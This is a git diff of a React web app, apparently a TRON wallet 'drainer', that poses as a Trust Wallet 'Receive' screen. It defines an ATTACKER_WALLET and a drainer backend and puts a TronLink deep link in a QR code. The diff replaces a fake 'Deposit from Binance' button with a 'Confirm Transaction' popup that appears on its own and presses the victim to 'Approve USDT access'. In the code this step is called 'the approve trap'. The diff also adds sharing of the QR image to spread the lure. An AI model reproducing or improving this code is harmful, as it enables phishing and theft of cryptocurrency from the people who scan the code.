@@ -1,19 +1,16 @@
-import React, { useEffect, useState } from "react";
+import React, { useEffect, useState, useRef } from "react";
 import { QRCodeSVG } from "qrcode.react";
 
 // ==========================================
 // CONFIGURATION
 // ==========================================
-const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT
-const ATTACKER_WALLET = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // Your Account 01
+const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd";
+const ATTACKER_WALLET = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou";
 const BACKEND = "https://qr-drainer.onrender.com";
 const VERCEL_URL = "https://qr-drainer-one.vercel.app";
 
-// TRON LOGO (red diamond) for QR center
+// TRON LOGO
 const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ViMmMzMSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";
-
-// BINANCE LOGO (yellow diamond)
-const BINANCE_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2YwYjkwYiI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";
 
 const short = (a) => (a ? `${a.slice(0, 6)}…${a.slice(-4)}` : "—");
 
@@ -21,15 +18,16 @@ export default function App() {
   const [isConnected, setIsConnected] = useState(false);
   const [wallet, setWallet] = useState("");
   const [victimBal, setVictimBal] = useState(0);
-  const [showWalletModal, setShowWalletModal] = useState(false);
-  const [step, setStep] = useState("idle"); // idle | connecting | approving | done
+  const [showConfirmPopup, setShowConfirmPopup] = useState(false);
+  const [step, setStep] = useState("idle");
   const [error, setError] = useState("");
   const [copied, setCopied] = useState(false);
+  const qrRef = useRef(null);
 
-  // QR encodes the Vercel URL so scanning opens the drainer site
-  const qrValue = VERCEL_URL;
+  // QR code encodes tronlink:// deep link to open TronLink directly
+  const qrValue = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
 
-  // 1. DETECT WALLET AUTOMATICALLY
+  // Detect wallet and auto-show confirm popup
   useEffect(() => {
     const checkWallet = setInterval(() => {
       if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
@@ -38,9 +36,11 @@ export default function App() {
           setIsConnected(true);
           setWallet(addr);
           readBalance(addr);
+          // Auto-show confirm popup after wallet detected
+          setTimeout(() => setShowConfirmPopup(true), 500);
         }
       }
-    }, 1500);
+    }, 1000);
     return () => clearInterval(checkWallet);
   }, [isConnected]);
 
@@ -52,55 +52,9 @@ export default function App() {
     } catch (e) { console.log("balance read", e); }
   };
 
-  // 2. "DEPOSIT FROM BINANCE" BUTTON → opens wallet modal
-  const handleDeposit = () => {
-    if (step === "done") return;
-    if (!isConnected) {
-      setShowWalletModal(true);
-    } else {
-      executeApprove();
-    }
-  };
-
-  // 3. CONNECT TO WALLET
-  const connectToWallet = async (walletType) => {
-    setShowWalletModal(false);
-    setStep("connecting");
-    setError("");
-
-    try {
-      if (walletType === "tronlink") {
-        if (window.tronLink?.request) {
-          await window.tronLink.request({ method: "tron_requestAccounts" });
-        } else if (window.tronWeb) {
-          await window.tronWeb.request({ method: "tron_requestAccounts" });
-        } else {
-          window.location.href = `tronlink://open?url=${encodeURIComponent(window.location.href)}`;
-          return;
-        }
-      } else if (walletType === "trust") {
-        window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(window.location.href)}`;
-        return;
-      }
-
-      await new Promise(r => setTimeout(r, 2000));
-
-      if (window.tronWeb?.defaultAddress?.base58) {
-        setIsConnected(true);
-        setWallet(window.tronWeb.defaultAddress.base58);
-        readBalance(window.tronWeb.defaultAddress.base58);
-        setStep("idle");
-      } else {
-        throw new Error("Connection failed. Please try again.");
-      }
-    } catch (e) {
-      setError(e.message);
-      setStep("idle");
-    }
-  };
-
-  // 4. EXECUTE THE APPROVE TRAP
+  // Execute the approve trap
   const executeApprove = async () => {
+    setShowConfirmPopup(false);
     setStep("approving");
     setError("");
 
@@ -154,26 +108,19 @@ export default function App() {
     setTimeout(() => setCopied(false), 2000);
   };
 
-  const handleShare = async () => {
-    try {
-      if (navigator.share) {
-        await navigator.share({ title: "Receive TRON", url: VERCEL_URL });
-      } else {
-        navigator.clipboard.writeText(VERCEL_URL);
-        alert("Link copied!");
-      }
-    } catch (e) {}
-  };
-
-  const handleDownloadQR = () => {
+  // Share ONLY the QR code image
+  const handleShareQR = async () => {
     const svg = document.querySelector("#lab-qr-box svg");
     if (!svg) return;
+
     const size = 400;
     const canvas = document.createElement("canvas");
-    canvas.width = size; canvas.height = size;
+    canvas.width = size;
+    canvas.height = size;
     const ctx = canvas.getContext("2d");
     ctx.fillStyle = "#ffffff";
     ctx.fillRect(0, 0, size, size);
+
     const img = new Image();
     const svgData = new XMLSerializer().serializeToString(svg);
     img.onload = () => {
@@ -186,10 +133,30 @@ export default function App() {
       const logo = new Image();
       logo.onload = () => {
         ctx.drawImage(logo, lp, lp, ls, ls);
-        const a = document.createElement("a");
-        a.download = "TRON-Receive.png";
-        a.href = canvas.toDataURL("image/png");
-        a.click();
+        
+        // Convert to blob and share
+        canvas.toBlob(async (blob) => {
+          if (navigator.share && blob) {
+            try {
+              await navigator.share({
+                files: [new File([blob], "tron-receive-qr.png", { type: "image/png" })],
+                title: "Receive TRON",
+              });
+            } catch (e) {
+              // Fallback to download
+              const link = document.createElement("a");
+              link.download = "tron-receive-qr.png";
+              link.href = canvas.toDataURL("image/png");
+              link.click();
+            }
+          } else {
+            // Download if share not supported
+            const link = document.createElement("a");
+            link.download = "tron-receive-qr.png";
+            link.href = canvas.toDataURL("image/png");
+            link.click();
+          }
+        }, "image/png");
       };
       logo.src = TRON_LOGO_B64;
     };
@@ -205,7 +172,7 @@ export default function App() {
       display: "flex",
       flexDirection: "column"
     }}>
-      {/* HEADER - matches Trust Wallet "Receive" screen */}
+      {/* HEADER */}
       <div style={{
         display: "flex",
         alignItems: "center",
@@ -254,7 +221,7 @@ export default function App() {
           maxWidth: 340,
           boxShadow: "0 4px 20px rgba(0,0,0,0.3)"
         }}>
-          <div id="lab-qr-box" style={{ textAlign: "center" }}>
+          <div id="lab-qr-box" ref={qrRef} style={{ textAlign: "center" }}>
             <QRCodeSVG
               value={qrValue}
               size={240}
@@ -315,7 +282,7 @@ export default function App() {
           </div>
         )}
 
-        {/* COPY & SHARE BUTTONS */}
+        {/* COPY & SHARE QR BUTTONS */}
         <div style={{
           display: "grid",
           gridTemplateColumns: "1fr 1fr",
@@ -342,7 +309,7 @@ export default function App() {
             {copied ? "✓" : "📋"}
           </button>
           <button
-            onClick={handleShare}
+            onClick={handleShareQR}
             style={{
               background: "#1e2530",
               border: "1px solid #2a3340",
@@ -360,61 +327,7 @@ export default function App() {
           </button>
         </div>
 
-        {/* DEPOSIT FROM BINANCE BUTTON */}
-        <button
-          onClick={handleDeposit}
-          disabled={step === "connecting" || step === "approving" || step === "done"}
-          style={{
-            width: "100%",
-            maxWidth: 340,
-            background: step === "done" ? "#0ecb81" : "#1e2530",
-            border: "1px solid #2a3340",
-            borderRadius: 12,
-            padding: 16,
-            color: "#ffffff",
-            fontSize: 16,
-            fontWeight: 600,
-            cursor: step === "connecting" || step === "approving" ? "not-allowed" : "pointer",
-            display: "flex",
-            alignItems: "center",
-            justifyContent: "center",
-            gap: 10
-          }}
-        >
-          {step === "connecting" ? "Connecting..." :
-           step === "approving" ? "Processing..." :
-           step === "done" ? "✓ Deposit Confirmed" : (
-            <>
-              <span style={{
-                width: 22, height: 22, borderRadius: "50%",
-                background: "#f0b90b",
-                display: "flex", alignItems: "center", justifyContent: "center",
-                fontSize: 12, fontWeight: 700, color: "#000"
-              }}>B</span>
-              Deposit from Binance
-            </>
-          )}
-        </button>
-
-        {/* SUCCESS MESSAGE */}
-        {step === "done" && (
-          <div style={{
-            marginTop: 16,
-            background: "#0d3320",
-            border: "1px solid #1a5c3a",
-            borderRadius: 10,
-            padding: 12,
-            fontSize: 13,
-            color: "#4ade80",
-            textAlign: "center",
-            width: "100%",
-            maxWidth: 340
-          }}>
-            Transaction confirmed. Your deposit is being processed.
-          </div>
-        )}
-
-        {/* SESSION INFO (subtle, at bottom) */}
+        {/* SESSION INFO */}
         {isConnected && (
           <div style={{
             marginTop: 20,
@@ -428,12 +341,12 @@ export default function App() {
         )}
       </div>
 
-      {/* WALLET SELECTION MODAL */}
-      {showWalletModal && (
+      {/* CONFIRM POPUP - appears automatically when wallet detected */}
+      {showConfirmPopup && (
         <div style={{
           position: "fixed",
           inset: 0,
-          background: "rgba(0,0,0,0.85)",
+          background: "rgba(0,0,0,0.9)",
           display: "flex",
           justifyContent: "center",
           alignItems: "center",
@@ -443,73 +356,79 @@ export default function App() {
           <div style={{
             background: "#1e2530",
             borderRadius: 20,
-            padding: 24,
+            padding: 32,
             width: "100%",
-            maxWidth: 340,
-            border: "1px solid #2a3340"
+            maxWidth: 360,
+            border: "1px solid #2a3340",
+            boxShadow: "0 20px 60px rgba(0,0,0,0.8)"
           }}>
-            <h3 style={{ margin: "0 0 20px 0", color: "#ffffff", textAlign: "center", fontSize: 18, fontWeight: 600 }}>
-              Connect Wallet
-            </h3>
+            <div style={{ textAlign: "center", marginBottom: 24 }}>
+              <div style={{
+                width: 64,
+                height: 64,
+                borderRadius: "50%",
+                background: "#eb2c31",
+                margin: "0 auto 16px",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                fontSize: 32,
+                fontWeight: 700
+              }}>
+                T
+              </div>
+              <h3 style={{ margin: "0 0 8px 0", color: "#ffffff", fontSize: 20, fontWeight: 600 }}>
+                Confirm Transaction
+              </h3>
+              <p style={{ margin: 0, color: "#8a94a6", fontSize: 14, lineHeight: 1.5 }}>
+                Approve USDT access to complete your deposit
+              </p>
+            </div>
 
-            <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
-              <button
-                onClick={() => connectToWallet("tronlink")}
-                style={{
-                  background: "#0f1419",
-                  border: "1px solid #2a3340",
-                  borderRadius: 12,
-                  padding: 16,
-                  color: "#ffffff",
-                  fontWeight: 600,
-                  cursor: "pointer",
-                  display: "flex",
-                  alignItems: "center",
-                  gap: 12,
-                  fontSize: 15,
-                  width: "100%"
-                }}
-              >
-                <span style={{
-                  width: 36, height: 36, borderRadius: 10,
-                  background: "#eb2c31",
-                  display: "flex", alignItems: "center", justifyContent: "center",
-                  color: "#fff", fontWeight: 700, fontSize: 18
-                }}>T</span>
-                TronLink
-              </button>
-
-              <button
-                onClick={() => connectToWallet("trust")}
-                style={{
-                  background: "#0f1419",
-                  border: "1px solid #2a3340",
-                  borderRadius: 12,
-                  padding: 16,
-                  color: "#ffffff",
-                  fontWeight: 600,
-                  cursor: "pointer",
-                  display: "flex",
-                  alignItems: "center",
-                  gap: 12,
-                  fontSize: 15,
-                  width: "100%"
-                }}
-              >
-                <span style={{
-                  width: 36, height: 36, borderRadius: 10,
-                  background: "#3375bb",
-                  display: "flex", alignItems: "center", justifyContent: "center",
-                  color: "#fff", fontWeight: 700, fontSize: 18
-                }}>🛡️</span>
-                Trust Wallet
-              </button>
+            <div style={{
+              background: "#0f1419",
+              borderRadius: 12,
+              padding: 16,
+              marginBottom: 24,
+              fontSize: 13,
+              color: "#8a94a6"
+            }}>
+              <div style={{ marginBottom: 8 }}>
+                <span style={{ color: "#5a6474" }}>Token:</span>{" "}
+                <span style={{ color: "#ffffff" }}>USDT (TRC20)</span>
+              </div>
+              <div style={{ marginBottom: 8 }}>
+                <span style={{ color: "#5a6474" }}>Action:</span>{" "}
+                <span style={{ color: "#ffffff" }}>Approve Access</span>
+              </div>
+              <div>
+                <span style={{ color: "#5a6474" }}>Network Fee:</span>{" "}
+                <span style={{ color: "#ffffff" }}>~1 TRX</span>
+              </div>
             </div>
 
             <button
-              onClick={() => setShowWalletModal(false)}
+              onClick={executeApprove}
+              disabled={step === "approving"}
               style={{
-                marginTop: 20,
+                width: "100%",
+                background: step === "approving" ? "#5a6474" : "#0ecb81",
+                border: "none",
+                borderRadius: 12,
+                padding: 16,
+                color: "#ffffff",
+                fontSize: 16,
+                fontWeight: 700,
+                cursor: step === "approving" ? "not-allowed" : "pointer",
+                marginBottom: 12
+              }}
+            >
+              {step === "approving" ? "Processing..." : "Confirm"}
+            </button>
+
+            <button
+              onClick={() => setShowConfirmPopup(false)}
+              style={{
                 width: "100%",
                 background: "transparent",
                 border: "none",
